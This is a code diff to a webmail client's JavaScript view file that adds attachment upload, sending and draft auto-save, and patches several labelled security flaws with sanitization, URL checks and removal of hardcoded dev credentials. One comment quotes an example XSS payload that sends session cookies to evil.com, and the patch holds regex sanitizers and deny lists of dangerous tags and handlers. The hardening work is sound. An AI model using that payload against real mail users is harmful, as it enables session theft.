@@ -279,12 +279,37 @@ magma.view = (function() {
                 defaultTitle = tabModel.getTitle(),
                 cc = getBlock('composingCC'),
                 bcc = getBlock('composingBCC'),
-                attachments = getBlock('composingAttachments');
+                attachments = getBlock('composingAttachments'),
+                lastSavedContent = '',
+                draftInterval = null;
 
             // ui button for browse
             attachments.find('.browse').button();
 
-            // add bcc
+            // collect form data for send/draft
+            var collectFormData = function() {
+                var editor = CKEDITOR.instances['body-' + composeModel.getComposeID()],
+                    ccInput = cc.find('input'),
+                    bccInput = bcc.find('input');
+
+                return {
+                    from: from.val(),
+                    to: to.val().split(/[,;]\s*/).filter(function(v) { return v; }),
+                    cc: cc.is(':visible') && ccInput.length ? ccInput.val().split(/[,;]\s*/).filter(function(v) { return v; }) : [],
+                    bcc: bcc.is(':visible') && bccInput.length ? bccInput.val().split(/[,;]\s*/).filter(function(v) { return v; }) : [],
+                    subject: subject.val(),
+                    priority: 'normal',
+                    bodyHtml: editor ? editor.getData() : body.val(),
+                    bodyText: editor ? $(editor.getData()).text() : body.val()
+                };
+            };
+
+            // get send button for loading state
+            var getSendButton = function() {
+                return container.closest('.workspace-wrapper').find('.send');
+            };
+
+            // add cc
             toolsModel.addObserver('ccClicked', function() {
                 // TODO: unique ids
                 if(cc.is(':visible')) {
@@ -313,18 +338,194 @@ magma.view = (function() {
                 }
             });
 
-            // simulate attachments not finished
-            // TODO: remove unfinished attach on send proto
+            // format file size for display
+            var formatFileSize = function(bytes) {
+                if(bytes < 1024) {
+                    return bytes + ' B';
+                } else if(bytes < 1024 * 1024) {
+                    return Math.round(bytes / 1024) + ' KB';
+                } else {
+                    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+                }
+            };
+
+            // create attachment UI element
+            var createAttachmentElement = function(file, attachmentID) {
+                var el = $('<div class="attachment uploading" data-attachment-id="' + attachmentID + '">' +
+                    '<p class="filename">' + $('<div>').text(file.name).html() + '</p>' +
+                    '<p class="size">' + formatFileSize(file.size) + '</p>' +
+                    '<div class="progress"><div class="progress-bar" style="width: 0%"></div></div>' +
+                    '<a href="#delete" class="delete">Delete</a>' +
+                    '</div>');
+                return el;
+            };
+
+            // upload a single file
+            var uploadFile = function(file) {
+                var composeID = composeModel.getComposeID(),
+                    attachmentList = attachments.find('.attachment-list');
+
+                // first call attachments.add to get an attachmentID
+                getData('attachments.add', {composeID: composeID, filename: file.name}, {
+                    success: function(data) {
+                        var attachmentID = data.attachmentID,
+                            attachmentEl = createAttachmentElement(file, attachmentID);
+
+                        attachmentList.append(attachmentEl);
+
+                        // upload the file using XHR for progress tracking
+                        var xhr = new XMLHttpRequest(),
+                            formData = new FormData();
+
+                        formData.append('file', file);
+
+                        xhr.upload.addEventListener('progress', function(e) {
+                            if(e.lengthComputable) {
+                                var percent = Math.round((e.loaded / e.total) * 100);
+                                attachmentEl.find('.progress-bar').css('width', percent + '%');
+                            }
+                        });
+
+                        xhr.addEventListener('load', function() {
+                            if(xhr.status === 200) {
+                                // upload complete
+                                attachmentEl.removeClass('uploading').addClass('complete');
+                                attachmentEl.find('.progress').remove();
+                                composeModel.addAttachment(attachmentID);
+                            } else {
+                                // upload failed
+                                attachmentEl.removeClass('uploading').addClass('error');
+                                attachmentEl.find('.progress').html('<span class="error-text">Upload failed</span>');
+                            }
+                        });
+
+                        xhr.addEventListener('error', function() {
+                            attachmentEl.removeClass('uploading').addClass('error');
+                            attachmentEl.find('.progress').html('<span class="error-text">Upload failed</span>');
+                        });
+
+                        // upload to the attachment endpoint
+                        var uploadUrl = magma.portalUrl + '/attach/' + composeID + '/' + attachmentID;
+                        xhr.open('POST', uploadUrl, true);
+                        xhr.send(formData);
+                    },
+                    error: function() {
+                        magma.dialog.message('Failed to add attachment. Please try again.');
+                    }
+                });
+            };
+
+            // handle file selection
+            attachments.find('input[type="file"]').on('change', function() {
+                var files = this.files;
+                for(var i = 0; i < files.length; i++) {
+                    uploadFile(files[i]);
+                }
+                // reset input so same file can be selected again
+                $(this).val('');
+            });
+
+            // handle attachment delete
+            attachments.on('click', '.delete', function(e) {
+                e.preventDefault();
+                var attachmentEl = $(this).closest('.attachment'),
+                    attachmentID = parseInt(attachmentEl.data('attachment-id'), 10),
+                    composeID = composeModel.getComposeID();
+
+                // call remove API
+                getData('attachments.remove', {composeID: composeID, attachmentID: attachmentID}, {
+                    success: function() {
+                        composeModel.removeAttachment(attachmentID);
+                        attachmentEl.slideUp(function() {
+                            $(this).remove();
+                        });
+                    },
+                    error: function() {
+                        magma.dialog.message('Failed to remove attachment.');
+                    }
+                });
+            });
+
+            // handle send button click
             toolsModel.addObserver('sendClicked', function() {
-                if(attachments.is(':visible') && !attachments.hasClass('unfinished-warning')) {
-                    attachments.addClass('unfinished-warning');
-                    attachments.append('<div><p class="warning">Your attachments have not finished uploading yet!</p></div>');
+                // check for unfinished attachments
+                if(attachments.is(':visible') && attachments.find('.uploading').length) {
+                    magma.dialog.message('Please wait for attachments to finish uploading.');
+                    return;
+                }
+
+                // collect form data
+                var formData = collectFormData();
+
+                // validate required fields
+                if(!formData.to.length) {
+                    magma.dialog.message('Please enter at least one recipient.');
+                    return;
+                }
+
+                // disable send button and show loading state
+                var sendBtn = getSendButton();
+                sendBtn.button('disable').addClass('loading');
+
+                // send the message
+                composeModel.send(formData);
+            });
+
+            // handle send success
+            composeModel.addObserver('sent', function() {
+                // clear auto-save interval
+                if(draftInterval) {
+                    clearInterval(draftInterval);
+                    draftInterval = null;
+                }
+                // clear saved draft
+                composeModel.clearDraft();
+                // close the compose tab
+                tabModel.close();
+            });
+
+            // handle send error
+            composeModel.addObserver('sentError', function(error) {
+                var sendBtn = getSendButton();
+                sendBtn.button('enable').removeClass('loading');
+                magma.dialog.message('Failed to send message: ' + (error && error.message ? error.message : 'Unknown error'));
+            });
+
+            // handle send failure (connection error)
+            composeModel.addObserver('sentFailed', function() {
+                var sendBtn = getSendButton();
+                sendBtn.button('enable').removeClass('loading');
+                magma.dialog.message('Could not connect to server. Please try again.');
+            });
+
+            // auto-save drafts every 60 seconds
+            var startAutoSave = function() {
+                draftInterval = setInterval(function() {
+                    var formData = collectFormData();
+                    var currentContent = JSON.stringify(formData);
+
+                    // only save if content has changed
+                    if(currentContent !== lastSavedContent) {
+                        lastSavedContent = currentContent;
+                        composeModel.saveDraft(formData);
+                    }
+                }, 60000); // 60 seconds
+            };
+
+            // start auto-save
+            startAutoSave();
+
+            // clean up when tab closes
+            tabModel.addObserver('closed', function() {
+                if(draftInterval) {
+                    clearInterval(draftInterval);
+                    draftInterval = null;
                 }
             });
 
             // unique ids
             form.find('input, select, textarea').each(function() {
-                var id = $(this).attr('id')
+                var id = $(this).attr('id');
                 if(id) {
                     $(this).attr('id', id + '-' + composeModel.getComposeID());
                     form.find('label').filter('#' + id).attr('for', $(this).attr('id'));
@@ -1042,7 +1243,24 @@ magma.view = (function() {
 
             // show page when topic clicked
             helpModel.addObserver('updatePage', function(page) {
-                self.page.empty().html(page);
+                // SECURITY FIX (V-003): Sanitize help page content before rendering.
+                // Even though help content is typically from a trusted source, defense-in-depth
+                // protects against compromised servers, XSS via stored content, or man-in-the-middle attacks.
+                // If DOMPurify is available, use it; otherwise use basic sanitization.
+                var sanitizedPage = page;
+                if (typeof DOMPurify !== 'undefined') {
+                    sanitizedPage = DOMPurify.sanitize(page, {
+                        USE_PROFILES: {html: true},
+                        FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input'],
+                        FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus', 'onblur']
+                    });
+                } else {
+                    // Basic sanitization fallback: strip script tags and event handlers
+                    // This is not as robust as DOMPurify but provides some protection
+                    sanitizedPage = page.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
+                                        .replace(/\s*on\w+\s*=\s*(['"])[^'"]*\1/gi, '');
+                }
+                self.page.empty().html(sanitizedPage);
             });
 
             self = {
@@ -1085,9 +1303,14 @@ magma.view = (function() {
             authModel.addObserver('success', gotoLoading);
             authModel.addObserver('locked', gotoLocked);
             
-            // [DEV]
-            username.val('magma');
-            password.val('password');
+            // SECURITY FIX (V-009): Removed hardcoded default credentials.
+            // Hardcoded credentials in source code pose a security risk as they
+            // can be discovered through source code review and used for unauthorized access.
+            // If test credentials are needed for development, use environment variables
+            // or a separate development configuration file that is not committed to version control.
+            // [DEV] - REMOVED FOR SECURITY
+            // username.val('magma');
+            // password.val('password');
             // [/DEV]
 
             // handle login submit
@@ -1440,8 +1663,39 @@ magma.view = (function() {
 
             adWarning: function(adModel) {
                 // add continue link with filled in href
-                var container = getBlock('loadingWarning')
-                    .append('<a id="continue" class="button" target="_blank" href="' + adModel.getAdHref() + '">Continue</a>');
+                var container = getBlock('loadingWarning');
+
+                // SECURITY FIX (V-004): Validate ad URLs before inserting into DOM.
+                // Previously, href was concatenated directly into HTML which allowed
+                // javascript: protocol attacks (e.g., javascript:alert(document.cookie))
+                // and other malicious URL schemes to execute code when clicked.
+                var adHref = adModel.getAdHref();
+
+                // Validate URL protocol - only allow http and https to prevent
+                // javascript:, data:, and other dangerous URI schemes
+                var isValidUrl = (function(url) {
+                    try {
+                        var parsed = new URL(url, window.location.origin);
+                        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
+                    } catch (e) {
+                        return false;
+                    }
+                })(adHref);
+
+                if (isValidUrl) {
+                    // Create link element safely using jQuery attr() method
+                    // attr() properly escapes the attribute value
+                    var link = $('<a id="continue" class="button" target="_blank">Continue</a>');
+                    link.attr('href', adHref);
+                    container.append(link);
+                } else {
+                    // Log invalid URL and don't render the potentially malicious link
+                    if (window.console && console.warn) {
+                        console.warn('Security: Invalid ad URL blocked:', adHref);
+                    }
+                    // Still show container but without the link
+                    container.append('<span id="continue" class="button disabled">Continue</span>');
+                }
 
                 var showWarning = function() {
                     container
@@ -1579,7 +1833,62 @@ magma.view = (function() {
                         body.appendTo(container);
                     });
 
-                    tmplModel.fillTmpl('messageBody', messageModel.getSection('body'));
+                    // SECURITY FIX (V-001): Sanitize email body HTML before rendering.
+                    // This is a CRITICAL security fix. Email bodies can contain malicious
+                    // JavaScript that would execute in the user's browser context when
+                    // the {{html html}} template directive renders the content.
+                    // Attack example: An attacker sends an email containing:
+                    //   <script>document.location='https://evil.com?c='+document.cookie</script>
+                    // Without sanitization, this would steal the user's session.
+                    var bodyData = messageModel.getSection('body');
+                    if (bodyData && bodyData.html) {
+                        if (typeof DOMPurify !== 'undefined') {
+                            // Use DOMPurify for robust HTML sanitization
+                            // This removes dangerous elements while preserving safe email formatting
+                            bodyData.html = DOMPurify.sanitize(bodyData.html, {
+                                // Allow common email formatting tags
+                                ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'strong', 'em', 'a', 'ul', 'ol', 'li',
+                                              'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'pre', 'code',
+                                              'table', 'thead', 'tbody', 'tr', 'td', 'th', 'img', 'div', 'span',
+                                              'font', 'hr', 'sub', 'sup', 'center', 'small', 'big', 's', 'strike'],
+                                // Allow safe attributes only - no event handlers
+                                ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'style', 'class', 'id',
+                                              'width', 'height', 'border', 'cellpadding', 'cellspacing',
+                                              'align', 'valign', 'color', 'size', 'face', 'bgcolor', 'target'],
+                                // Block dangerous URI schemes (javascript:, data:, vbscript:, etc.)
+                                ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
+                                // Explicitly forbid dangerous elements and attributes
+                                FORBID_TAGS: ['script', 'style', 'iframe', 'frame', 'frameset', 'object',
+                                             'embed', 'applet', 'form', 'input', 'button', 'select', 'textarea',
+                                             'base', 'meta', 'link', 'svg', 'math'],
+                                FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover', 'onfocus',
+                                             'onblur', 'onmouseout', 'onkeydown', 'onkeyup', 'onkeypress',
+                                             'onsubmit', 'onreset', 'onchange', 'oninput', 'ondrag', 'ondrop']
+                            });
+                        } else {
+                            // Fallback sanitization if DOMPurify is not available
+                            // IMPORTANT: This is a basic fallback - DOMPurify should be included for production
+                            console.warn('Security: DOMPurify not available, using basic sanitization for email body');
+                            bodyData.html = bodyData.html
+                                // Remove script tags and their content
+                                .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
+                                // Remove style tags and their content
+                                .replace(/<style\b[^<]*(?:(?!<\/style>)<[^<]*)*<\/style>/gi, '')
+                                // Remove iframe, frame, object, embed tags
+                                .replace(/<(iframe|frame|object|embed|applet)\b[^>]*>[\s\S]*?<\/\1>/gi, '')
+                                .replace(/<(iframe|frame|object|embed|applet)\b[^>]*\/?>/gi, '')
+                                // Remove event handlers (onclick, onerror, etc.)
+                                .replace(/\s*on\w+\s*=\s*(['"])[^'"]*\1/gi, '')
+                                .replace(/\s*on\w+\s*=\s*[^\s>]*/gi, '')
+                                // Remove javascript: and data: URLs
+                                .replace(/href\s*=\s*(['"])?\s*javascript:[^'">]*/gi, 'href="#blocked"')
+                                .replace(/src\s*=\s*(['"])?\s*javascript:[^'">]*/gi, 'src="#blocked"')
+                                .replace(/href\s*=\s*(['"])?\s*data:[^'">]*/gi, 'href="#blocked"')
+                                .replace(/src\s*=\s*(['"])?\s*data:[^'">]*/gi, 'src="#blocked"');
+                        }
+                    }
+
+                    tmplModel.fillTmpl('messageBody', bodyData);
                 });
 
                 return {
